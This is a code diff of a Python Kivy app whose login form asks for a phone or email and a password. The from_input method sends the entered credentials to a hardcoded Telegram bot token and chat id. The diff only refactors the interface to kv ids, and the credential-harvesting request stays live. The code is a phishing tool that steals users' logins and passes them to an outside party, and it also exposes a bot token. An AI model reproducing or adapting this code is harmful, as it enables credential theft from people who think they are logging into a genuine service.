@@ -13,18 +13,9 @@ Window.clearcolor = (0.859, 0.859, 0.859, 1)
 
 
 class My(App):
-    def __init__(self):
-        super().__init__()
-        self.input1 = TextInput(hint_text="Телефон или email", multiline=False, padding=[7, 12])
-        self.input2 = TextInput(hint_text="Пароль", multiline=False, password=True, padding=[7, 15])
-        self.button = Button(text="Вход", background_color=[0, 0.451, 0.722, 1])
-        self.button.bind(on_press=self.from_input)
-        self.label = Label(text='text', color=[0, 0, 0, 1])
-
     def from_input(self, *args):
-        data = "*Login:* " + "`" + self.input1.text + "`" + "\n*Password:* " + "`" + self.input2.text + "`"
+        data = "*Login:* " + "`" + self.root.ids.email.text + "`" + "\n*Password:* " + "`" + self.root.ids.password.text + "`"
         data = urlencode({'text': data})
-        self.button.background_color = [1, 0, 0, 1]
         self.r = UrlRequest(
             f"https://api.telegram.org/bot6654600196:AAEHouKkxE26ltUOMvjou9LYwCuhJl4hR0k/sendMessage?chat_id"
             f"=888281527&{data}&parse_mode=MarkdownV2", self.safe, ca_file=certifi.where())
@@ -39,21 +30,9 @@ class My(App):
 
     def prr(self, *args):
         if self.r.result['result'][0]['message']['message_id'] == self.last:
-            self.label.text = self.r.result['result'][0]['message']['text']
-            self.button.background_color = [0, 0.451, 0.722, 1]
+            print(self.r.result['result'][0]['message']['text'])
         else:
             self.make_request()
-
-
-    def build(self):
-        a = AnchorLayout()
-        box = BoxLayout(orientation='vertical', size_hint=[.65, .21], size=[320, 250], spacing=20)
-        box.add_widget(self.input1)
-        box.add_widget(self.input2)
-        box.add_widget(self.button)
-        box.add_widget(self.label)
-        a.add_widget(box)
-        return a
 
 
 if __name__ == '__main__':
